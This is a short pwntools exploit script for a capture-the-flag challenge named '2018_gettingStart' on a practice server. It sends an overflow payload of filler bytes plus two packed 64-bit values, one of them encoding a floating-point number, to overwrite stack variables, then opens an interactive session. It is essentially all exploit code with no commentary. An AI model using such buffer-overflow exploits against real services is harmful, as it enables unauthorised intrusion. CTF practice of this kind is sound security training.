from pwn import *

#p = process('./2018_gettingStart')
p = remote('node4.buuoj.cn', 26874)

payload = b'a' * 0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)

p.sendline(payload)

p.interactive()